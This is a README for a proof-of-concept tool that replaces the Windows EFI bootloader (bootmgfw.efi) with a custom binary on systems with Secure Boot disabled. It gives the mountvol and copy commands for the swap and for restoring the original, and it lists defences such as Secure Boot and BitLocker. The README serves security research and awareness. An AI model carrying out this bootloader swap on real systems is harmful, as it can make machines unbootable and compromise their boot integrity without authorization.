# uEFIrus - EFI Bootloader Manipulation PoC

## **⚠️ Disclaimer**
**This tool is for educational and research purposes only.** It is designed as a **proof-of-concept** for red team assessments and security awareness. **Do not use this on unauthorized systems.**

Modifying EFI bootloaders can render a system **unbootable** and cause data loss. **Use this tool only in controlled environments, such as virtual machines or test systems, where you have explicit permission.**

The author is **not responsible** for any misuse of this tool. Engaging in unauthorized system modification may violate laws and terms of service.

---

## **Overview**
This project demonstrates how an attacker with administrator privileges can modify the **EFI System Partition (ESP)** on Windows systems with **Secure Boot disabled**. The proof-of-concept:

- **Mounts the EFI partition**
- **Backs up the original Windows bootloader** (`bootmgfw.efi`)
- **Replaces it with a custom EFI binary** that displays a message ("Hacked")
- **Crashes the PC**
- **Upon reboot, the PC boots into our custom EFI application instead of Windows**

This PoC aims to highlight security weaknesses in improperly configured boot environments and emphasize the importance of **Secure Boot and EFI integrity monitoring**.

---

## **Usage**
### **Requirements**
- Windows system (8+) with Secure Boot **disabled**
- Administrator privileges
- PowerShell or Command Prompt with elevated rightss

### **Execution (Test Environment Only!)**
1. **Mount EFI Partition**:
   ```powershell
   mountvol S: /S
   ```
2. **Backup Original Bootloader**:
   ```powershell
   copy S:\EFI\Microsoft\Boot\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw_backup.efi
   ```
3. **Replace with Custom Bootloader**:
   ```powershell
   copy custom_boot.efi S:\EFI\Microsoft\Boot\bootmgfw.efi
   ```
4. **Reboot the System**
   - Upon restart, the system will display the PoC message and then crash.

### **Restoring the Original Bootloader**
To revert the changes:
```powershell
copy S:\EFI\Microsoft\Boot\bootmgfw_backup.efi S:\EFI\Microsoft\Boot\bootmgfw.efi
```

---

## **Defensive Measures**
To protect against this type of attack:
- **Enable Secure Boot**: Prevents unsigned EFI modifications.
- **Use BitLocker**: Encrypts the bootloader to prevent tampering.
- **Monitor EFI Partition**: Use security tools to detect unauthorized modifications.
- **Restrict Admin Access**: Ensure only trusted users have elevated privileges.

---

## **Legal & Ethical Use**
By using this tool, you agree that:
- It is for **security research and educational purposes only**.
- You will **not use it on systems you do not own or have permission to test**.
- You acknowledge the **risks of modifying EFI firmware** and take full responsibility for any consequences.



---

## **Contributing**
Contributions are welcome! If you’d like to improve this tool or suggest security mitigations, feel free to submit a pull request.

---

## **License**
This project is released under the **Apache License**. See `LICENSE` for details.

**⚠️ WARNING: Use this tool responsibly. Unauthorized use may be illegal.**

